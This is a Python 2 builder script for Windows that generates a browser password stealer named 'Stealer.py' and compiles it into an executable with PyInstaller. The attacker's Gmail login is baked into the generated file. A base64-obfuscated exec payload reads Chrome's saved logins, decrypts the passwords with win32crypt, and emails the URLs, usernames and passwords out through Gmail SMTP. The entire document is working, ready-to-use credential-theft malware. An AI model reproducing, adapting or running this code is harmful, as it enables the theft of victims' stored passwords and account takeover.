import os
import sys
import getpass as p
import subprocess
if os.name == "nt":
        PathName = 'C:\Python27\Scripts'
        FileName = 'C:\Python27\Scripts\pyinstaller.exe'
        if (os.path.isdir(PathName) == False):
            print('Please Install Python2.7 Check-->[Fail]')
            sys.exit(0)
        elif (os.path.isfile(FileName) == False):
            print 'Please Install Pyinstaller Check-->[Fail]'
            sys.exit(0)
        else:
            print "Dependency [python27][Pyinstaller] Check-->[OK].!"

else:
     print "Use Windows OS.!"
     sys.exit(0)

gmail_user = raw_input('Enter Gmail ID : ')
gmail_password = p.getpass('Enter Gmail password: ')
lines = ['import base64','import os','import sys','import sqlite3','import argparse','import win32crypt','import smtplib','import getpass','gmail_user=str("%s")' % gmail_user.decode('utf-8').lower(),'gmail_password=str("%s")' % gmail_password,'exec(base64.b64decode("DQoNCmRlZiBtYWluKCk6DQogICAgZGF0YV9saXN0ID0gW10NCiAgICBESVIgPSBvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpICsgXA0KICAgICAgICAgICAgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcJw0KICAgIGlmIChvcy5wYXRoLmlzZGlyKERJUikgPT0gRmFsc2UpOg0KICAgICAgICBwcmludCAib2siDQogICAgICAgIHN5cy5leGl0KDApDQogICAgdHJ5Og0KICAgICAgICBjb25uZWN0aW9uID0gc3FsaXRlMy5jb25uZWN0KERJUiArICJMb2dpbiBEYXRhIikNCiAgICAgICAgd2l0aCBjb25uZWN0aW9uOg0KICAgICAgICAgICAgd2l0aCBjb25uZWN0aW9uOg0KICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm5lY3Rpb24uY3Vyc29yKCkNCiAgICAgICAgICAgICAgICB2ID0gY3Vyc29yLmV4ZWN1dGUoDQogICAgICAgICAgICAgICAgICAgICdTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zJykNCiAgICAgICAgICAgICAgICB2YWx1ZSA9IHYuZmV0Y2hhbGwoKQ0KICAgICAgICBmb3IgaW5mb3JtYXRpb24gaW4gdmFsdWU6DQogICAgICAgICAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOg0KICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKA0KICAgICAgICAgICAgICAgICAgICAgICAgaW5mb3JtYXRpb25bMl0sIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdDQogICAgICAgICAgICAgICAgICAgIGlmIHBhc3N3b3JkOg0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0YV9saXN0LmFwcGVuZCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ29yaWdpbl91cmwnOiBpbmZvcm1hdGlvblswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAndXNlcm5hbWUnOiBpbmZvcm1hdGlvblsxXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncGFzc3dvcmQnOiBzdHIocGFzc3dvcmQpDQogICAgICAgICAgICAgICAgICAgICAgICB9KQ0KDQogICAgZXhjZXB0IHNxbGl0ZTMuT3BlcmF0aW9uYWxFcnJvciBhcyBlcnJvcjoNCiAgICAgICAgZSA9IHN0cihlcnJvcikNCiAgICAgICAgaWYgKGUgPT0gJ2RhdGFiYXNlIGlzIGxvY2tlZCcpOg0KICAgICAgICAgICAgc3lzLmV4aXQoMCkNCiAgICAgICAgZWxpZiAoZSA9PSAnbm8gc3VjaCB0YWJsZTogbG9naW5zJyk6DQogICAgICAgICAgICBzeXMuZXhpdCgwKQ0KICAgICAgICBlbGlmIChlID09ICd1bmFibGUgdG8gb3BlbiBkYXRhYmFzZSBmaWxlJyk6DQogICAgICAgICAgICBzeXMuZXhpdCgwKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgc3lzLmV4aXQoMCkNCiAgICAgICAgICAgIA0KICAgIHNlbnRfZnJvbSA9IGdtYWlsX3VzZXIgIA0KICAgIHRvID0gZ21haWxfdXNlciAgDQogICAgc3ViamVjdCA9ICJVc2VybmFtZSA6IitnZXRwYXNzLmdldHVzZXIoKSAgDQogICAgYm9keSA9IHN0cihkYXRhX2xpc3QpDQogICAgZW1haWxfdGV4dCA9ICIiIlwgIA0KICAgIEZyb206ICVzICANCiAgICBUbzogJXMgIA0KICAgIFN1YmplY3Q6ICVzDQoNCiAgICAlcw0KICAgICIiIiAlIChzZW50X2Zyb20sIHRvLCBzdWJqZWN0LCBib2R5KSAgDQogICAgc2VydmVyID0gc210cGxpYi5TTVRQX1NTTCgnc210cC5nbWFpbC5jb20nLCA0NjUpDQogICAgc2VydmVyLmVobG8oKQ0KICAgIHNlcnZlci5sb2dpbihnbWFpbF91c2VyLCBnbWFpbF9wYXNzd29yZCkNCiAgICBzZXJ2ZXIuc2VuZG1haWwoc2VudF9mcm9tLCB0bywgZW1haWxfdGV4dCkNCiAgICBzZXJ2ZXIuY2xvc2UoKQ0KDQptYWluKCk="))']
with open("Stealer.py","w") as e:
    for line in lines:
        e.writelines(line + "\n")

with open("generate.bat","w") as x:
    x.writelines('c:\ \n set PATH=%PATH%;C:\Python27\Scripts\nstart pyinstaller -F Stealer.py')
subprocess.call(['generate.bat'])
